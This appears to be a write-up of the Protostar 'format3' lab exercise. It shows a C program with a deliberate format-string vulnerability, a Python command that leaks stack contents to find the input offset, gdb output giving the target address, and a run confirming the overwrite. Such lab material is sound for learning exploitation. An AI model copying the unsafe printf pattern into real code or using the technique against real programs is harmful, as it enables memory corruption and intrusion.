### challenge
```txt
About
This level advances from format2 and shows how to write more than 1 or 2 bytes of memory to the process. This also teaches you to carefully control what data is being written to the process memory.

This level is at /opt/protostar/bin/format3
```

### format3.c
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);
  
  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

### finding offset
```txt
user@protostar:/opt/protostar/bin$ python -c 'print "A"*4 + ".%x"*30' > /tmp/format3.txt
user@protostar:/opt/protostar/bin$ ./format3 < /tmp/format3.txt 
AAAA.0.bffff5d0.b7fd7ff4.0.0.bffff7d8.804849d.bffff5d0.200.b7fd8420.bffff614.41414141.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78
target is 00000000 :(

```

### addresses
```txt
(gdb) x/x 0x080496e8
...
(gdb) 
0x80496f4 <target>:	0x00000000


(gdb) print /x 0x01025544-4
$1 = 0x1025540

>>> 0x1025540
16930112
```

 ### solution 1
 ```txt
user@protostar:/opt/protostar/bin$ ./format3 < /tmp/format3.bin | grep target
you have modified the target :)
 ```
